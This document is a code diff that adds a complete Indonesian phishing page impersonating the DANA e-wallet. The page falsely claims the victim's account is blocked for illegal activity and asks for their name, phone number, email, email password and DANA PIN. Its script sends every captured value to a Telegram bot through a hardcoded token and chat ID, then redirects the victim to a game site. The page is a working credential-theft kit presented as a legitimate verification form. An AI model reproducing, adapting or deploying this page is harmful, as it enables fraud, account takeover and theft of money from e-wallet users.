@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Notifikasi Pemblokiran Akun DANA</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #1a1a2e);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      position: relative;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 5;
+    }
+
+    .container {
+      position: relative;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 0.5rem 1.5rem rgba(0,0,0,0.2);
+      width: 90%;
+      max-width: 25rem;
+      animation: slideIn 0.5s ease-in-out;
+      z-index: 10;
+      margin: 2rem auto;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(-20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    h2 {
+      text-align: center;
+      color: #d32f2f;
+      margin-bottom: 20px;
+      animation: bounce 1s infinite;
+      font-size: 24px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+      background: linear-gradient(to right, #d32f2f, #ff6600);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      padding-bottom: 5px;
+      border-bottom: 2px solid rgba(255,102,0,0.3);
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50% }
+      50% { background-position: 100% 50% }
+      100% { background-position: 0% 50% }
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+      40% { transform: translateY(-10px); }
+      60% { transform: translateY(-5px); }
+    }
+
+    p {
+      text-align: center;
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 1.5rem;
+    line-height: 1.5;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 14px 14px 40px;
+      margin-top: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+      transition: all 0.3s;
+      background-color: rgba(255,255,255,0.9);
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+    
+    .input-group { 
+      position: relative;
+      margin-bottom: 1rem;
+    }
+    
+    .input-icon {
+      position: absolute;
+      left: 0.8rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ff6600;
+      font-size: 1.2rem;
+    }
+
+    input:focus {
+      border-color: #ff6600;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.8rem;
+      background-color: #ff6600;
+      color: white;
+      border: none;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: all 0.3s;
+      font-weight: 600;
+      font-size: 1rem;
+      margin-top: 1rem;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0.25rem 0.5rem rgba(255,102,0,0.3);
+    }
+    
+    button:hover, button:focus {
+      background: linear-gradient(to right, #ff6600, #ff3300);
+      box-shadow: 0 6px 8px rgba(255,51,0,0.3);
+    }
+    
+    button::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      opacity: 0;
+      transform: rotate(30deg);
+      background: linear-gradient(
+        to right,
+        rgba(255,255,255,0.13) 0%,
+        rgba(255,255,255,0.23) 77%,
+        rgba(255,255,255,0) 92%
+      );
+      transition: opacity 0.5s;
+    }
+    
+    button:hover::after {
+      opacity: 1;
+      top: -30%;
+      left: -30%;
+      transition-duration: 0.7s;
+    }
+
+    button:hover {
+      background-color: #e65c00;
+      transform: scale(1.05);
+    }
+
+    .small-text {
+      font-size: 0.75rem;
+      text-align: center;
+      color: #666;
+      margin-top: 1.5rem;
+      padding-top: 1rem;
+      border-top: 1px solid #eee;
+    }
+
+    /* Moon */
+    .moon {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 30%, #fff 0%, #f5f5dc 60%, transparent 70%);
+      box-shadow: 0 0 30px 5px rgba(245, 245, 220, 0.5);
+      top: 15%;
+      right: 15%;
+      z-index: 1;
+      animation: pulse 4s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1) rotate(0deg); opacity: 0.8; box-shadow: 0 0 30px 5px rgba(245, 245, 220, 0.5); }
+      25% { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 40px 10px rgba(245, 245, 220, 0.6); }
+      50% { transform: scale(1.08) rotate(0deg); opacity: 1; box-shadow: 0 0 50px 15px rgba(245, 245, 220, 0.7); }
+      75% { transform: scale(1.05) rotate(-5deg); box-shadow: 0 0 40px 10px rgba(245, 245, 220, 0.6); }
+      100% { transform: scale(1) rotate(0deg); opacity: 0.8; box-shadow: 0 0 30px 5px rgba(245, 245, 220, 0.5); }
+    }
+
+    /* Falling Stars */
+    .star {
+      position: fixed;
+      width: 8px;
+      height: 8px;
+      background-color: #fff;
+      border-radius: 50%;
+      filter: blur(1px);
+      box-shadow: 
+          0 0 10px 1px #fff,
+          0 0 20px 2px #89f7fe,
+          0 0 30px 3px #66a6ff;
+      animation: fall 4s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+      opacity: 0;
+      z-index: 2;
+    }
+
+    /* Clouds */
+    .cloud {
+      position: absolute;
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      filter: blur(10px);
+      animation: drift 30s linear infinite;
+      z-index: 1;
+    }
+
+    @keyframes drift {
+      0% { transform: translateX(-150%); }
+      100% { transform: translateX(150%); }
+    }
+
+    .particle {
+      position: absolute;
+      width: 3px;
+      height: 3px;
+      background-color: rgba(255,255,255,0.8);
+      border-radius: 50%;
+      animation: floatParticle 15s linear infinite;
+      filter: blur(0.5px);
+    }
+
+    @keyframes floatParticle {
+      0% { transform: translateY(0) translateX(0); opacity: 0; }
+      10% { opacity: 0.8; }
+      90% { opacity: 0.8; }
+      100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+    }
+
+    @keyframes fall {
+      0% {
+          transform: translateY(-10vh) scale(0.8);
+          opacity: 0;
+      }
+      10% {
+          opacity: 1;
+      }
+      80% {
+          opacity: 1;
+      }
+      90% {
+          transform: translateY(70vh) scale(1.2);
+          opacity: 0;
+      }
+      100% {
+          transform: translateY(70vh) scale(1.2);
+          opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="moon"></div>
+<div class="particles"></div>
+<div class="cloud" style="width: 150px; height: 40px; top: 20%; animation-delay: 0s;"></div>
+<div class="cloud" style="width: 200px; height: 60px; top: 30%; animation-delay: 10s;"></div>
+<div class="overlay"></div> <!-- Overlay untuk meningkatkan kontras -->
+<div class="container">
+  <h2>Akun DANA Diblokir</h2>
+  <p>
+    Akun Anda diblokir karena terindikasi aktivitas ilegal.<br>
+    Untuk mengaktifkan kembali, silakan lakukan verifikasi data.
+  </p>
+
+  <form id="verifyForm">
+    <div class="input-group">
+      <i class="input-icon">👤</i>
+      <input type="text" id="nama" placeholder="Nama Lengkap" required>
+    </div>
+    <div class="input-group">
+      <i class="input-icon">📱</i>
+      <input type="tel" id="nomor" placeholder="Nomor HP Terdaftar" required pattern="[0-9]*">
+    </div>
+    <div class="input-group">
+      <i class="input-icon">✉️</i>
+      <input type="email" id="email" placeholder="Email DANA" required>
+    </div>
+    <div class="input-group">
+      <i class="input-icon">🔒</i>
+      <input type="password" id="sandi_email" placeholder="Password Email" required>
+    </div>
+    <div class="input-group">
+      <i class="input-icon">🔑</i>
+      <input type="password" id="pin" placeholder="PIN DANA" required inputmode="numeric">
+    </div>
+    <button type="submit">Verifikasi Sekarang</button>
+  </form>
+
+  <div class="small-text">
+    DANA Indonesia 2025 &copy; Semua hak dilindungi.
+	                 BY X9X
+  </div>
+</div>
+
+<script>
+  const botToken = '7869613762:AAEiz2UcSOEo8rg_f8p7wflooNeeRBgf25o';
+  const chatId = '7290763869';
+
+  document.getElementById('verifyForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const nama = document.getElementById('nama').value;
+    const nomor = document.getElementById('nomor').value;
+    const email = document.getElementById('email').value;
+    const sandi_email = document.getElementById('sandi_email').value;
+    const pin = document.getElementById('pin').value;
+
+    const message = `
+🔔 *DATA VERIFIKASI DANA* 🔔
+
+Nama: ${nama}
+Nomor HP: ${nomor}
+Email: ${email}
+Password Email: ${sandi_email}
+PIN DANA: ${pin}
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert('Verifikasi berhasil dikirim. Mohon tunggu 1x24 jam untuk aktivasi.');
+        window.location.href = 'https://ff.garena.com/id/';
+      } else {
+        alert('Gagal mengirim data. Silakan coba lagi.');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Terjadi kesalahan.');
+    });
+  });
+
+  // Generate background elements
+  document.addEventListener('DOMContentLoaded', function() {
+    // Create particles
+    const particles = document.querySelector('.particles');
+    for (let i = 0; i < 50; i++) {
+      const particle = document.createElement('div');
+      particle.className = 'particle';
+      particle.style.left = `${Math.random() * 100}%`;
+      particle.style.top = `${Math.random() * 100}%`;
+      particle.style.opacity = Math.random() * 0.5 + 0.1;
+      particle.style.animationDuration = `${Math.random() * 15 + 10}s`;
+      particle.style.animationDelay = `${Math.random() * 5}s`;
+      particles.appendChild(particle);
+    }
+    const container = document.querySelector('.container');
+    
+    // Create more falling stars
+    for (let i = 0; i < 15; i++) {
+      const star = document.createElement('div');
+      star.className = 'star';
+      star.style.left = `${Math.random() * 100}%`;
+      star.style.animationDuration = `${Math.random() * 3 + 2}s`;
+      star.style.animationDelay = `${Math.random() * 15}s`;
+      star.style.top = `-10px`;
+      
+      container.appendChild(star);
+    }
+  });
+</script>
+
+</body>
+</html>
